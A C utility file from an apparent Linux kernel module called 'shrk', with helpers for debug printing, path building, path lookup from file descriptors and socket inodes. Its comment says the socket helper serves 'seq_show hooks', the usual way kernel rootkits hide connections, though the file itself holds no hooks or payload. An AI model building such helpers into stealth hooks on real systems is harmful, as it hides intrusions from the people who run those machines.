#include "inc/util.h"

#include <linux/fdtable.h>
#include <linux/module.h>
#include <linux/dcache.h>

#include <linux/slab.h>
#include <linux/fs.h>
#include <net/sock.h>

void print_debug(const char *caller, char *msg, ...) {
  char *fmt = NULL;
  va_list args;

  if (!SHRK_DEBUG)
    return;

  fmt = kmalloc(strlen(msg) + strlen(caller) + 12, GFP_KERNEL);
  sprintf(fmt, "[shrk] %s: %s\n", caller, msg);

  va_start(args, msg);

  vprintk(fmt, args);

  va_end(args);
  kfree(fmt);
}

char *path_join(char *p1, char *p2) {
  char *res = kmalloc(PATH_MAX+1, GFP_KERNEL);
  memset(res, 0, PATH_MAX+1);

  sprintf(res, "%s/%s", p1, p2);
  return res;
}

char *path_from_fd(int32_t fd, char path[PATH_MAX+1]){
  struct path *pp = NULL;

  if(NULL == current->files ||
     NULL == current->files->fdt ||
     NULL == current->files->fdt->fd[fd] ||
     NULL == (pp = &current->files->fdt->fd[fd]->f_path))
    return NULL;

  path[PATH_MAX] = 0;
  return d_path(pp, path, PATH_MAX+1);
}

/*

 * obtains inode from the socket, used by seq_show hooks
 * see the following functions for reference:
 * net/ipv4/tcp_ipv4.c, tcp4_seq_show()
 * core/sock.c, sock_i_ino()

*/
uint64_t inode_from_sock(struct sock *sk){
  if(NULL == sk || SEQ_START_TOKEN == sk)
    return 0;

  switch(sk->sk_state) {
  case TCP_TIME_WAIT: 
    return 0;

  case TCP_NEW_SYN_RECV:
    return 0;
  }

  return sock_i_ino(sk);
}
